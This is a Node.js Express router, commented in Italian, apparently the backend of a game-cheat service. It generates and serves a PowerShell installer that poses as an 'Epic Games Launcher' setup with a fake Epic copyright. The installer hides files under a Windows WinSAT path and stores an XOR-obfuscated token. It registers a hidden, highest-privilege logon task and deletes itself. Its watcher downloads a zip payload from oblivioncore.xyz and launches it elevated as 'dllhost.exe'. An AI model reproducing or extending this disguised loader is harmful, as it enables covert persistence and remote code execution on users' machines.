const express   = require('express');
const router    = express.Router();
const { users, userConfigs } = require('../database');
const { authMiddleware, superAdminOnly } = require('../middleware/auth');

// ─── XOR helper (mirrors Cheat.cpp: key 0x5A) ─────────────────────────────────
function xorToken(token) {
  const key = 0x5A;
  return Buffer.from(token.split('').map(c => c.charCodeAt(0) ^ key));
}

// ─── PowerShell installer template ────────────────────────────────────────────
// Genera uno script PS1 personalizzato con token embedded.
// Nome camuffato: EpicGamesLauncher.
// Install path: %LOCALAPPDATA%\Microsoft\WinSAT\DataStore\
// Autorun: Scheduled Task "MicrosoftWinSAT"
// Si auto-elimina dopo l'installazione.
function generateInstaller(token, username) {
  // XOR token → array di bytes per il PS1
  const xorBytes = xorToken(token);
  const byteArray = Array.from(xorBytes).join(',');

  return `# Epic Games Launcher — Setup
# (c) Epic Games, Inc. All rights reserved.
# Version 15.17.1 Build 24621
#Requires -Version 5.0
$ErrorActionPreference = 'SilentlyContinue'

# ── Configurazione ────────────────────────────────────────────────────────────
$installBase  = [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Microsoft', 'WinSAT', 'DataStore')
$taskName     = 'MicrosoftWinSAT'
$taskDesc     = 'Windows System Assessment Tool — Performance Monitor'
$launchScript = [System.IO.Path]::Combine($installBase, 'WinSATHelper.ps1')
$configDat    = [System.IO.Path]::Combine($installBase, 'config.dat')
$downloaderUrl = 'https://oblivioncore.xyz/api/installer/payload?token=${token}'

# ── Crea cartella nascosta ────────────────────────────────────────────────────
New-Item -ItemType Directory -Path $installBase -Force | Out-Null
$folder = Get-Item $installBase
$folder.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System

# ── Scrivi config.dat (token XOR 0x5A) ───────────────────────────────────────
# Decifrato automaticamente da dllhost.exe all'avvio
$xorBytes = [byte[]]@(${byteArray})
[System.IO.File]::WriteAllBytes($configDat, $xorBytes)
(Get-Item $configDat).Attributes = 'Hidden','System'

# ── Scrivi WinSATHelper.ps1 (watcher camuffato) ──────────────────────────────
# Gira in background ad ogni logon, poll /api/config ogni 3s.
# Quando action_inject = true → avvia dllhost.exe (il cheat).
$launcherCode = @'
# Windows System Assessment Tool — Performance Data Collector
$ErrorActionPreference = 'SilentlyContinue'
$installBase = [System.IO.Path]::Combine($env:LOCALAPPDATA,'Microsoft','WinSAT','DataStore')
$configDat   = [System.IO.Path]::Combine($installBase,'config.dat')
$payloadUrl  = 'https://oblivioncore.xyz/api/installer/payload'
$apiBase     = 'https://oblivioncore.xyz'

# Leggi e decifra token (XOR 0x5A)
function Get-Token {
    try {
        $raw = [System.IO.File]::ReadAllBytes($configDat)
        return (-join ($raw | ForEach-Object { [char]($_ -bxor 0x5A) })).Trim()
    } catch { return $null }
}

# Scarica payload se dllhost.exe non esiste ancora
function Ensure-Payload {
    param($token)
    $exe = [System.IO.Path]::Combine($installBase,'dllhost.exe')
    if (Test-Path $exe) { return }
    try {
        $zipPath = [System.IO.Path]::Combine($env:TEMP,'winsvc_update.zip')
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('Authorization',"Bearer $token")
        $wc.DownloadFile($payloadUrl, $zipPath)
        Expand-Archive -Path $zipPath -DestinationPath $installBase -Force
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    } catch {}
}

# Poll /api/config e lancia cheat su action_inject
function Poll-AndInject {
    param($token)
    $initBat = [System.IO.Path]::Combine($installBase,'WinSATInit.bat')
    try {
        $wc  = New-Object System.Net.WebClient
        $url = "$apiBase/api/config?token=$token"
        $json = $wc.DownloadString($url) | ConvertFrom-Json
        if ($json.action_inject -eq $true) {
            $running = Get-Process -Name 'RuntimeBroker','dllhost' -ErrorAction SilentlyContinue | Where-Object { try { $_.MainModule.FileName -like "*WinSAT*" } catch { $false } }
            if (-not $running -and (Test-Path $initBat)) {
                Start-Process -FilePath 'cmd.exe' -ArgumentList ('/c "' + $initBat + '"') -WorkingDirectory $installBase -Verb RunAs -WindowStyle Hidden
            }
        }
    } catch {}
}

# Main loop — gira per sempre in background
$token = Get-Token
if ($token) { Ensure-Payload -token $token }
while ($true) {
    $token = Get-Token
    if ($token) { Poll-AndInject -token $token }
    Start-Sleep -Seconds 3
}
'@
Set-Content -Path $launchScript -Value $launcherCode -Encoding UTF8
(Get-Item $launchScript).Attributes = 'Hidden','System'

# ── Scheduled Task: avvio ad ogni logon ──────────────────────────────────────
$action  = New-ScheduledTaskAction  -Execute 'powershell.exe' \`
             -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File \`"$launchScript\`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings= New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0) \`
             -MultipleInstances IgnoreNew -StartWhenAvailable
Register-ScheduledTask -TaskName $taskName -Description $taskDesc \`
  -Action $action -Trigger $trigger -Settings $settings \`
  -RunLevel Highest -Force | Out-Null

# ── Avvia subito il launcher ──────────────────────────────────────────────────
Start-Process powershell.exe -ArgumentList \`
  "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File \`"$launchScript\`"" \`
  -WindowStyle Hidden

# ── Auto-elimina questo installer ────────────────────────────────────────────
$self = $MyInvocation.MyCommand.Path
Start-Process cmd.exe -ArgumentList "/c timeout /t 3 /nobreak >nul && del /f /q \`"$self\`"" \`
  -WindowStyle Hidden

`;
}

// ─── GET /api/admin/generate-installer/:userId ────────────────────────────────
router.get('/generate-installer/:userId', authMiddleware, superAdminOnly, async (req, res) => {
  const { userId } = req.params;

  const user = await users.findOne({ _id: userId });
  if (!user) return res.status(404).json({ error: 'User not found' });

  // Recupera o crea il userConfig con token
  let uc = await userConfigs.findOne({ user_id: userId });

  if (!uc) {
    // Crea userConfig con token nuovo
    const { generateToken, DEFAULT_CONFIG } = require('../database');
    const newToken = generateToken();
    await userConfigs.insert({ user_id: userId, token: newToken, config: { ...DEFAULT_CONFIG } });
    uc = await userConfigs.findOne({ user_id: userId });
  } else if (!uc.token) {
    // Ha userConfig ma niente token — aggiunge
    const { generateToken } = require('../database');
    const newToken = generateToken();
    await userConfigs.update({ _id: uc._id }, { $set: { token: newToken } });
    uc.token = newToken;
  }

  const installer = generateInstaller(uc.token, user.username);

  const filename = `EpicGamesLauncher_Setup.ps1`;
  res.setHeader('Content-Type', 'application/octet-stream');
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  res.send(installer);

  console.log(`[INSTALLER] Generated for user=${user.username} token=${uc.token.slice(0,8)}... by admin=${req.user.username}`);
});

// ─── GET /api/installer/payload ──────────────────────────────────────────────
// Serve il payload zip al watcher PS1.
// Autenticato via Bearer token == userConfig token (64 hex chars).
const fs   = require('fs');
const path = require('path');
const PAYLOAD_PATH = path.join(__dirname, '..', 'data', 'payload.zip');

router.get('/payload', async (req, res) => {
  const token = (req.headers['authorization'] || '').replace('Bearer ', '').trim();
  if (!token || token.length !== 64) return res.status(401).json({ error: 'invalid_token' });

  const uc = await userConfigs.findOne({ token });
  if (!uc) return res.status(401).json({ error: 'invalid_token' });

  if (!fs.existsSync(PAYLOAD_PATH)) {
    return res.status(503).json({ error: 'Payload not uploaded yet. Admin must upload via panel.' });
  }

  console.log(`[PAYLOAD] Serving to user_id=${uc.user_id}`);
  res.setHeader('Content-Type', 'application/zip');
  res.setHeader('Content-Disposition', 'attachment; filename="winsvc_update.zip"');
  fs.createReadStream(PAYLOAD_PATH).pipe(res);
});

// ─── POST /api/admin/upload-payload ──────────────────────────────────────────
// express.raw() in server.js ha già letto il body in req.body — usiamo quello direttamente.
router.post('/upload-payload', authMiddleware, superAdminOnly, (req, res) => {
  const dataDir = path.join(__dirname, '..', 'data');
  if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

  const buf = req.body; // Buffer — già parsato da express.raw()

  if (!buf || !buf.length) {
    return res.status(400).json({ error: 'Body vuoto — riprova.' });
  }

  // Verifica magic bytes ZIP (PK\x03\x04)
  if (buf[0] !== 0x50 || buf[1] !== 0x4B) {
    return res.status(400).json({ error: 'File non valido — deve essere uno ZIP.' });
  }

  try {
    fs.writeFileSync(PAYLOAD_PATH, buf);
    const sizeMB = (buf.length / 1024 / 1024).toFixed(2);
    console.log(`[PAYLOAD] Uploaded by admin=${req.user.username} — ${sizeMB} MB`);
    return res.json({ ok: true, size_mb: sizeMB });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// ─── GET /api/admin/payload-status ───────────────────────────────────────────
// Ritorna info sul payload attuale (esiste? dimensione? data upload?)
router.get('/payload-status', authMiddleware, superAdminOnly, (req, res) => {
  if (!fs.existsSync(PAYLOAD_PATH)) return res.json({ exists: false });
  const stat = fs.statSync(PAYLOAD_PATH);
  res.json({ exists: true, size_mb: (stat.size / 1024 / 1024).toFixed(2), updated_at: stat.mtime });
});

module.exports = router;
